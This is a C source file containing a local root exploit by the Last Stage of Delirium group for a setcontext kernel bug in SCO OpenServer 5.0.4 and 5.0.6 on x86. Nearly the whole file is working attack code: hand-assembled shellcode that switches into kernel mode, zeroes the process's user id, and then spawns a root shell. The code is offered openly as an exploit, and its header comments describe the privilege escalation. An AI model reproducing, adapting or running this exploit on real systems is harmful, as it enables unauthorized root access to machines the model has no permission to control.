/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## setcontext kernel bug                                                   #*/

/*   the code forces operating system kernel to perform unauthorized context  */
/*   switch and transfer control to user procedure on processor 0 protection  */
/*   level. it is done through setcontext(ucontext_t *) system call.          */

/*   as a result command shell is spawned with effective root user privilege. */

#include <sys/types.h>
#include <sys/sysi86.h>
#include <sys/seg.h>
#include <sys/regset.h>
#include <sys/signal.h>
#include <ucontext.h>
#include <sys/user.h>
#include <sys/immu.h>

#define ofs(s,m)  (unsigned int)(&(((s*)0)->m))
#define ofsreg(r) (ofs(ucontext_t,uc_mcontext.regs[r]))
#define ofsuid()  (ofs(user_t,u_uid))
#define adr(a)    (char)(a),(char)(a>>8),(char)(a>>16),(char)(a>>24)

char asmcode[]={
    0x33,0xc0,                  /* xorl    %eax,%eax              */
    0xa3,adr(UVUBLK+ofsuid()),  /* movl    %eax,($adr)            */
    0x6a,USER_DS,               /* pushl   ??                     */
    0x51,                       /* pushl   %ecx                   */
    0x6a,USER_CS,               /* pushl   ??                     */
    0x53,                       /* pushl   %ebx                   */
    0xcb                        /* lret                           */
};

main(int argc,char **argv){
    ucontext_t uc;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("setcontext kernel bug for sco openserver 5.0.4 5.0.6 x86\n\n");

    printf("u.u_uid=0x%08x adr=0x%08x\n",UVUBLK+ofsuid(),asmcode);

    getcontext(&uc);
    uc.uc_mcontext.regs[CS]=KCSSEL;
    uc.uc_mcontext.regs[EIP]=(unsigned int)asmcode;

    {
    char code[]={
        0x8b,0x74,0x24,0x04,       /* movl    4(%esp),%esi           */
        0xe8,0x01,0,0,0,           /* call    <code+10>              */
        0xc3,                      /* ret                            */
        0x5b,                      /* popl    %ebx                   */
        0x89,0x5e,ofsreg(EBX),     /* movl    %ebx,??(%esi)          */
        0x89,0x66,ofsreg(ECX),     /* movl    %esp,??(%esi)          */
        0x56,                      /* pushl   %esi                   */
        0x6a,SETCONTEXT,           /* pushl   ??                     */
        0x6a,0,                    /* pushl   $0x0                   */
        0xb8,0x64,0,0,0,           /* movl    $0x64,%eax             */
        0x9a,0,0,0,0,0x07,0        /* lcall   0x7,0x1234             */
    };

    ((void(*)())code)(&uc);
    }

    execl("/bin/sh","lsd",0);
}

